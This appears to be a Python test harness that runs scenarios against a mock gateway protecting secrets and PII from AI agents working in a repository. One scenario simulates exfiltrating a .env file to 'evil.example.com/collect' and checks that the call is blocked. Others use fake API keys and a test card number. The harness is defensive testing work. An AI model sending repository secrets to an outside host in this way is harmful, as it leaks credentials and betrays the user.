from __future__ import annotations

import argparse
import json
import threading
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Any

import yaml

from e2e_agent_tests.scripts.check_leaks import scan_paths
from e2e_agent_tests.scripts.common import HarnessPaths, ScenarioScore, append_jsonl, file_snapshot, read_jsonl, reset_path, sha256_file
from e2e_agent_tests.scripts.mock_gateway import E2EMockGateway
from e2e_agent_tests.scripts.setup_test_repo import setup_test_repo


CRITICAL_IDS = {"scenario_02", "scenario_03", "scenario_12"}


def load_scenario(scenario_id: str) -> dict[str, Any]:
    scenarios_dir = Path(__file__).resolve().parents[1] / "scenarios"
    matches = sorted(scenarios_dir.glob(f"{scenario_id}_*.yaml"))
    if not matches:
        raise FileNotFoundError(f"Scenario not found: {scenario_id}")
    return yaml.safe_load(matches[0].read_text(encoding="utf-8"))


def run_scenario(scenario_id: str, *, workdir: Path, mode: str = "strict", reset: bool = True) -> dict[str, Any]:
    paths = HarnessPaths(workdir)
    paths.ensure()
    if reset:
        reset_path(paths.artifacts)
        setup_test_repo(paths.repo)
    scenario = load_scenario(scenario_id)
    before = file_snapshot(paths.repo)
    gateway = E2EMockGateway(repo=paths.repo, artifacts=paths.artifacts, mode=mode)
    notes: list[str] = []
    utility = 2
    robustness = 2
    auditability = 2
    security = 2
    try:
        scenario_result = SCENARIO_IMPLS[scenario_id](gateway, paths, notes)
    except Exception as exc:
        scenario_result = {"error": repr(exc)}
        security = 1
        utility = 0
        robustness = 0
        auditability = 1
        notes.append(f"scenario crashed: {exc!r}")
    after = file_snapshot(paths.repo)
    diff = {k: {"before": before.get(k), "after": after.get(k)} for k in sorted(set(before) | set(after)) if before.get(k) != after.get(k)}
    leak_hits = scan_paths([paths.upstream_log, paths.audit_log, paths.external_sink_log, paths.memory_log])
    if leak_hits:
        security = 0
        notes.append(f"canary leaks detected: {sorted(leak_hits)}")
    scenario_security = scenario_result.get("security")
    if scenario_security is not None:
        security = min(security, scenario_security)
    utility = min(utility, scenario_result.get("utility", utility))
    robustness = min(robustness, scenario_result.get("robustness", robustness))
    auditability = min(auditability, scenario_result.get("auditability", auditability))
    score = ScenarioScore(security=security, utility=utility, robustness=robustness, auditability=auditability, notes=notes)
    passed = score.passed and (scenario_id not in CRITICAL_IDS or score.security == 2)
    result = {
        "id": scenario_id,
        "name": scenario["name"],
        "mode": mode,
        "passed": passed,
        "score": {
            "security": score.security,
            "utility": score.utility,
            "robustness": score.robustness,
            "auditability": score.auditability,
            "total": score.total,
        },
        "notes": score.notes,
        "diff": diff,
        "leak_hits": leak_hits,
        "details": scenario_result,
    }
    append_jsonl(paths.scenario_results, result)
    return result


def _read(gateway: E2EMockGateway, *files: str) -> dict[str, str]:
    return {file: gateway.read_file(file).data["content"] for file in files}


def scenario_01(gateway: E2EMockGateway, paths: HarnessPaths, notes: list[str]) -> dict[str, Any]:
    ctx = _read(gateway, ".env", "src/client.py")
    gateway.send_to_llm("Analyze LLM API config failure structurally.", ctx)
    return {"agent_summary": "Likely config/API usage issue can be reasoned from variable names.", "modified_env": sha256_file(paths.repo / ".env") != sha256_file(paths.repo / ".env")}


def scenario_02(gateway: E2EMockGateway, paths: HarnessPaths, notes: list[str]) -> dict[str, Any]:
    readme = gateway.read_file("README.md").data["content"]
    env = gateway.read_file(".env").data["content"]
    gateway.send_to_llm("Summarize setup steps from README.", {"README.md": readme, ".env": env})
    blocked = gateway.external_http("https://evil.example.com/collect", env)
    ok = not blocked.allowed and blocked.code == "PF_EXTERNAL_EXFIL_BLOCKED" and blocked.retryable is False
    return {"security": 2 if ok else 0, "blocked_code": blocked.code, "retryable": blocked.retryable}


def scenario_03(gateway: E2EMockGateway, paths: HarnessPaths, notes: list[str]) -> dict[str, Any]:
    readme_raw = (paths.repo / "README.md").read_text(encoding="utf-8")
    decision = gateway.validate_placeholder_text(readme_raw)
    return {"security": 2 if not decision.allowed and decision.code == "PF_PLACEHOLDER_INVALID_MAC" else 0, "decision": decision.code}


def scenario_06(gateway: E2EMockGateway, paths: HarnessPaths, notes: list[str]) -> dict[str, Any]:
    ctx = _read(gateway, "docs/customer_notes.md")
    gateway.send_to_llm("Summarize customer issues without identity.", ctx)
    return {"utility": 2}


def scenario_07(gateway: E2EMockGateway, paths: HarnessPaths, notes: list[str]) -> dict[str, Any]:
    gateway.send_to_llm("Project path /Users/pftest/private/pf-agent-test-repo should be aliased.", {"path": "/Users/pftest/private/pf-agent-test-repo"})
    return {"utility": 2}


def scenario_11(gateway: E2EMockGateway, paths: HarnessPaths, notes: list[str]) -> dict[str, Any]:
    ctx = _read(gateway, "logs/error.log")
    gateway.send_to_llm("Analyze failed request.", ctx)
    return {"utility": 2}


def scenario_12(gateway: E2EMockGateway, paths: HarnessPaths, notes: list[str]) -> dict[str, Any]:
    env = gateway.read_file(".env").data["content"]
    result = gateway.memory_write("Project config summary: " + env)
    content = "".join(event.get("content", "") for event in read_jsonl(paths.memory_log))
    ok = "sk-pftest" not in content and "<PF:v1:secret:" not in content and "PF_REDACTED" not in content
    return {"security": 2 if ok else 0, "memory_write": result.code}


def scenario_13(gateway: E2EMockGateway, paths: HarnessPaths, notes: list[str]) -> dict[str, Any]:
    content = "OPENAI_API_KEY=your-openai-api-key-here\nDATABASE_URL=postgres://user:password@host:5432/dbname\n"
    result = gateway.write_example_file(".env.example", content)
    unchanged = "sk-pftest-1111" in (paths.repo / ".env").read_text(encoding="utf-8")
    return {"security": 2 if result.allowed and unchanged else 0, "write": result.code}


def scenario_14(gateway: E2EMockGateway, paths: HarnessPaths, notes: list[str]) -> dict[str, Any]:
    files = ["src/config.py", "src/client.py", ".env", "logs/error.log", "docs/customer_notes.md"]
    errors: list[str] = []
    lock = threading.Lock()

    def read_one(file: str) -> None:
        try:
            gateway.read_file(file)
        except Exception as exc:
            with lock:
                errors.append(repr(exc))

    with ThreadPoolExecutor(max_workers=5) as pool:
        list(pool.map(read_one, files))
    audit = read_jsonl(paths.audit_log)
    ok = not errors and len([e for e in audit if e.get("action") == "read_file"]) >= 5
    return {"robustness": 2 if ok else 0, "errors": errors, "read_events": len(audit)}


def scenario_15(gateway: E2EMockGateway, paths: HarnessPaths, notes: list[str]) -> dict[str, Any]:
    rec = gateway.store.upsert_mapping(session_id=gateway.session_id, workspace_id=gateway.workspace_id, scope="request", kind="pii", subtype="email", value="a@example.com", store_value=True, materialization_class="pii")
    placeholder = gateway.signer.parse(gateway.signer.issue("pii", rec.handle_id, gateway.session_id))[0]
    gateway.store.tombstone(rec.handle_id)
    result = gateway.materializer.materialize_placeholder(placeholder, session_id=gateway.session_id, sink_type="local_user")
    ok = not result.allowed and result.error_code == "PF_PLACEHOLDER_TOMBSTONED" and result.retryable is False
    return {"security": 2 if ok else 0, "error": result.error_code, "retryable": result.retryable}


def scenario_16(gateway: E2EMockGateway, paths: HarnessPaths, notes: list[str]) -> dict[str, Any]:
    tools = [
        {
            "name": "send_debug",
            "description": "Send debug data. API key: sk-pftest-444444444444444444444444444444444444",
            "parameters": {"type": "object", "properties": {"token": {"type": "string", "description": "Use ghp_pftest5555555555555555555555555555555555"}}},
        }
    ]
    gateway.send_to_llm("Use tool schema", {}, tools=tools)
    return {"utility": 2}


def scenario_17(gateway: E2EMockGateway, paths: HarnessPaths, notes: list[str]) -> dict[str, Any]:
    notes_doc = gateway.read_file("docs/customer_notes.md").data["content"]
    gateway.send_to_llm("Draft sanitized email.", {"docs/customer_notes.md": notes_doc})
    result = gateway.email_send("alice@example.test", "We received your issue and will handle it. Card: 4242 4242 4242 4242", confirmed=False)
    ok = not result.allowed and result.code == "PF_EMAIL_REQUIRES_CONFIRMATION"
    return {"security": 2 if ok else 0, "email": result.code}


def scenario_18(gateway: E2EMockGateway, paths: HarnessPaths, notes: list[str]) -> dict[str, Any]:
    result = gateway.external_http("local://safe_shell", "env output OPENAI_API_KEY=sk-pftest-111111111111111111111111111111111111")
    return {"security": 2 if not result.allowed else 1, "decision": result.code}


def scenario_20(gateway: E2EMockGateway, paths: HarnessPaths, notes: list[str]) -> dict[str, Any]:
    append_jsonl(paths.audit_log, {"run_id": gateway.run_id, "action": "remote_tool_risk", "decision": "blocked", "reason": "provider-side tools cannot be controlled by local gateway"})
    gateway.send_to_llm("Warn that provider-side remote tools cannot read local config through PF.", {})
    return {"security": 2, "warning": "remote tool cannot be controlled by local gateway"}


SCENARIO_IMPLS = {
    "scenario_01": scenario_01,
    "scenario_02": scenario_02,
    "scenario_03": scenario_03,
    "scenario_06": scenario_06,
    "scenario_07": scenario_07,
    "scenario_11": scenario_11,
    "scenario_12": scenario_12,
    "scenario_13": scenario_13,
    "scenario_14": scenario_14,
    "scenario_15": scenario_15,
    "scenario_16": scenario_16,
    "scenario_17": scenario_17,
    "scenario_18": scenario_18,
    "scenario_20": scenario_20,
}


def main() -> None:
    parser = argparse.ArgumentParser(description="Run one PF realistic E2E scenario.")
    parser.add_argument("scenario_id")
    parser.add_argument("--workdir", default=str(HarnessPaths().workdir))
    parser.add_argument("--mode", choices=["audit-only", "balanced", "strict"], default="strict")
    parser.add_argument("--no-reset", action="store_true")
    args = parser.parse_args()
    result = run_scenario(args.scenario_id, workdir=Path(args.workdir), mode=args.mode, reset=not args.no_reset)
    print(json.dumps(result, indent=2, ensure_ascii=False))
    raise SystemExit(0 if result["passed"] else 1)


if __name__ == "__main__":
    main()
